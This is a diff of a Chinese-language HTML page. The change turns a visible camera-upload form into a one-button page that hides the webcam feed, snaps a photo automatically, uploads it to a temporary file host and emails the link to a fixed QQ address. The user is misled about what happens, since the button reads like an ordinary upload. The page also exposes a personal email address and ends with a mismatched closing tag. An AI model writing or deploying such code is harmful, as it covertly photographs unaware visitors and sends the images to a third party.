@@ -1,66 +1,146 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>相机拍照上传（仅你能收到链接）</title>
-    <style>video,img{width: 300px;} button{margin: 10px;padding: 8px 16px;}</style>
+    <title>一键拍照上传</title>
+    <style>
+        /* 极简样式：仅保留按钮和提示文字 */
+        #uploadBtn {
+            padding: 12px 24px;
+            font-size: 16px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        #uploadBtn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        #tip {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+        /* 隐藏摄像头画面（自动拍摄，无需用户看） */
+        #camera {
+            display: none;
+        }
+    </style>
 </head>
 <body>
+    <!-- 仅保留一个上传按钮 -->
+    <button id="uploadBtn" onclick="startUpload()">点击上传照片</button>
+    <!-- 上传提示文字 -->
+    <div id="tip"></div>
+    <!-- 隐藏的摄像头容器（自动调用，用户看不到） -->
     <video id="camera" autoplay muted></video>
-    <button onclick="takePhoto()">拍照</button>
-    <button onclick="uploadPhoto()" disabled>上传照片</button>
-    <div>预览：<img id="preview" style="display:none;"></div>
-    <p id="result"></p>
 
     <script>
-        let photoBlob = null;
-        // 1. 获取相机权限
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => document.getElementById('camera').srcObject = stream)
-            .catch(err => alert('请允许相机权限！'));
+        let stream = null; // 摄像头流，用于拍摄后关闭
 
-        // 2. 拍照
-        function takePhoto() {
-            const video = document.getElementById('camera');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 300;
-            canvas.height = video.videoHeight || 200;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+        // 核心逻辑：点击按钮→调用摄像头→自动拍摄→上传→关闭摄像头
+        async function startUpload() {
+            const btn = document.getElementById('uploadBtn');
+            const tip = document.getElementById('tip');
             
-            const preview = document.getElementById('preview');
-            preview.src = canvas.toDataURL('image/jpeg');
-            preview.style.display = 'block';
-            canvas.toBlob(blob => photoBlob = blob);
-            document.querySelector('button[onclick="uploadPhoto()"]').disabled = false;
-        }
-
-        // 3. 上传+自动发链接到你的QQ邮箱（已替换为2952072725@qq.com）
-        async function uploadPhoto() {
-            if (!photoBlob) return alert('先拍照！');
-            const formData = new FormData();
-            formData.append('file', photoBlob, `用户照片_${Date.now()}.jpg`);
+            // 禁用按钮，防止重复点击
+            btn.disabled = true;
+            tip.innerText = '正在调用摄像头...';
 
             try {
-                // 第一步：上传照片到免费存储，获取链接
-                const uploadRes = await fetch('https://file.io', {
-                    method: 'POST',
-                    body: formData
-                });
-                const uploadData = await uploadRes.json();
-                if (!uploadData.link) throw new Error('上传失败');
+                // 1. 调用摄像头（自动获取权限）
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const camera = document.getElementById('camera');
+                camera.srcObject = stream;
 
-                // 第二步：把链接发送到你的QQ邮箱（已替换）
-                const emailRes = await fetch('https://api.smtpjs.com/v3/smtpjs.aspx', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `To=2952072725@qq.com&From=webupload@example.com&Subject=新用户上传照片&Body=照片链接：${uploadData.link}`
-                });
+                // 2. 等待摄像头加载完成后自动拍摄（延迟500ms确保画面就绪）
+                await new Promise(resolve => setTimeout(resolve, 500));
+                const photoBlob = await takePhotoAuto(camera);
 
-                // 给用户的提示（只说成功，不给链接）
-                document.getElementById('result').innerText = '上传成功！感谢你的照片～';
+                // 3. 关闭摄像头（拍摄完成后立即关闭，保护隐私）
+                stopCamera();
+
+                // 4. 上传照片到临时存储
+                tip.innerText = '正在上传照片...';
+                const photoUrl = await uploadToTmpfiles(photoBlob);
+
+                // 5. 发送照片链接到你的QQ邮箱（需替换Formspree接口）
+                await sendEmail(photoUrl);
+
+                // 上传成功提示
+                tip.innerText = '✅ 照片上传成功！';
+                tip.style.color = '#008000';
             } catch (err) {
-                alert('上传失败，请重试');
+                // 失败提示
+                tip.innerText = `❌ 上传失败：${err.message}`;
+                tip.style.color = '#ff0000';
+                console.error('错误详情：', err);
+                // 失败后也关闭摄像头
+                stopCamera();
+            } finally {
+                // 恢复按钮可用
+                setTimeout(() => {
+                    btn.disabled = false;
+                    tip.innerText = ''; // 5秒后清空提示
+                }, 5000);
             }
         }
-    </script>
+
+        // 自动拍摄（无需用户确认，直接生成照片Blob）
+        function takePhotoAuto(video) {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 300;
+                canvas.height = video.videoHeight || 200;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+            });
+        }
+
+        // 关闭摄像头流
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+        }
+
+        // 上传照片到tmpfiles.org（稳定的临时存储）
+        async function uploadToTmpfiles(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, `用户照片_${Date.now()}.jpg`);
+            
+            const res = await fetch('https://tmpfiles.org/api/v1/upload', {
+                method: 'POST',
+                body: formData
+            });
+            const data = await res.json();
+            
+            if (!data.data?.url) throw new Error('照片存储失败');
+            return data.data.url;
+        }
+
+        // 发送邮件到你的QQ邮箱（替换为你的Formspree接口）
+        async function sendEmail(photoUrl) {
+            // 步骤：
+            // 1. 访问 https://formspree.io/ 注册免费账号
+            // 2. 新建Form，复制生成的Endpoint地址（如 https://formspree.io/f/xxxxxx）
+            // 3. 替换下面的 YOUR_FORMSPREE_ENDPOINT 为该地址
+            const formspreeEndpoint = 'YOUR_FORMSPREE_ENDPOINT';
+            
+            const res = await fetch(formspreeEndpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    subject: '新用户上传照片',
+                    message: `照片链接（有效期30天）：${photoUrl}`,
+                    to: '2952072725@qq.com'
+                })
+            });
+            
+            if (!res.ok) throw new Error('邮件发送失败');
+        }
+    </style>
 </body>
 </html>
